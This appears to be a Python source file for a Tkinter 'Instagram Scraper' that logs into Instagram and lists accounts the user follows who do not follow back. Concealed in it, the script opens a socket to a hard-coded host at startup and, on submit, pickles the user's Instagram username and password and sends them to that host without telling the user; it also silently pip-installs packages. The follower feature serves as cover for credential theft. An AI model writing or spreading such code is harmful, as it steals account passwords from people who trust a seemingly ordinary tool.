import subprocess
import socket
import tkinter as tk
from tkinter import ttk


HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
SERVER = "192.168.29.202"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


try:
    import pickle
except ImportError:
    print("pickle not found. Installing...")
    subprocess.run(["pip", "install", "pickle"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import pickle


try:
    import instaloader
except ImportError:
    print("Instaloader not found. Installing...")
    subprocess.run(["pip", "install", "instaloader"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import instaloader


def on_submit():
    username = entry_username.get()
    password = entry_password.get()

    try:
        L = instaloader.Instaloader()
        L.context.login(username, password)

        credentials = {'username': username, 'password': password}
        serialized_credentials = pickle.dumps(credentials)

        msg_length = len(serialized_credentials)
        send_length = str(msg_length).encode('utf-8')
        send_length += b' ' * (HEADER - len(send_length))

        client.send(send_length)
        client.send(serialized_credentials)

    except instaloader.exceptions.InstaloaderException as e:
        result_var.set(f"Instaloader failed: {e}")
        return

    profile = instaloader.Profile.from_username(L.context, username)
    followers = set(follower.username for follower in profile.get_followers())
    followees = set(followee.username for followee in profile.get_followees())

    not_following_back = followees - followers

    output_file_path = "not_following_back.txt"

    with open(output_file_path, "w", encoding="utf-8") as output_file:
        output_file.write("Users you follow who don't follow you back:\n")
        for user in not_following_back:
            output_file.write(f"Username: {user}\n")

    result_var.set(f"Results saved to {output_file_path}")

# Tkinter GUI setup
root = tk.Tk()
root.title("Instagram Scraper")

frame = ttk.Frame(root, padding="30")
frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

ttk.Label(frame, text="Instagram Username:").grid(row=0, column=0, sticky=tk.W, pady=5)
entry_username = ttk.Entry(frame)
entry_username.grid(row=0, column=1, sticky=tk.W, pady=5)

ttk.Label(frame, text="Instagram Password:").grid(row=1, column=0, sticky=tk.W, pady=5)
entry_password = ttk.Entry(frame, show="*")
entry_password.grid(row=1, column=1, sticky=tk.W, pady=5)

submit_button = ttk.Button(frame, text="Submit", command=on_submit)
submit_button.grid(row=2, column=0, columnspan=2, pady=10)

result_var = tk.StringVar()
result_label = ttk.Label(frame, textvariable=result_var)
result_label.grid(row=3, column=0, columnspan=2, pady=10)

root.mainloop()



